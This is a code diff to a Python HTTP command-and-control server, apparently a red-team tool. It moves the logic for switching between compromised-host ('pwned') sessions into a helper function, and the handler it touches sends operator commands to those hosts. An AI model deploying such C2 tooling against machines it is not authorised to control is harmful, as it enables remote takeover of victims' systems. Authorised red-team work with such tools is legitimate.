@@ -8,6 +8,35 @@ from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT,
     CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 from inputimeout import inputimeout, TimeoutOccurred
 
+def get_new_session():
+    """ This function check if other sessions exists. If none re-initialize variables. However, if sessions do exist,
+    allow the red teamer to pick one to become a new active session. """
+    global active_session, pwned_dict, pwned_id
+
+    del pwned_dict[active_session]
+    # if dict empty, re-init vars to their starting val
+    if not pwned_dict:
+        print("Waiting for new connection")
+        pwned_id = 0
+        active_session = 1
+    else:
+        while True:
+            # display sessions in dict to switch a new active one.
+            print(*pwned_dict.items(), sep="\n")
+            try:
+                new_session = int(input("\nChoose a session nbr to make active: "))
+            except ValueError:
+                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
+                continue
+            if new_session in  pwned_dict:
+                active_session = new_session
+                print(f"\nActive session is now: {pwned_dict[active_session]}")
+                break
+            else:
+                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
+                continue
+
+
 class C2Handler(BaseHTTPRequestHandler):
     """ This is a child class of the BaseHTTPRequestHandler class.
     It handles all HTTP request of our C2 server. """
@@ -50,28 +79,8 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.wfile.write(cmd.encode())
                 except BrokenPipeError as e:
                     print(f"Lost connection to {pwned_dict[active_session]}.\n")
-                    del pwned_dict[active_session]
-                    # if dict empty, re-init vars to their starting val
-                    if not pwned_dict:
-                        print("Waiting for new connection")
-                        pwned_id = 0
-                        active_session = 1
-                    else:
-                        while True:
-                            # display sessions in dict to switch a new active one.
-                            print(*pwned_dict.items(), sep="\n")
-                            try:
-                                new_session = int(input("\nChoose a session nbr to make active: "))
-                            except ValueError:
-                                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
-                                continue
-                            if new_session in  pwned_dict:
-                                active_session = new_session
-                                print(f"\nActive session is now: {pwned_dict[active_session]}")
-                                break
-                            else:
-                                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
-                                continue
+                    get_new_session()
+                    
 
             # if client is in pwned_dict but is not our active session
             else:
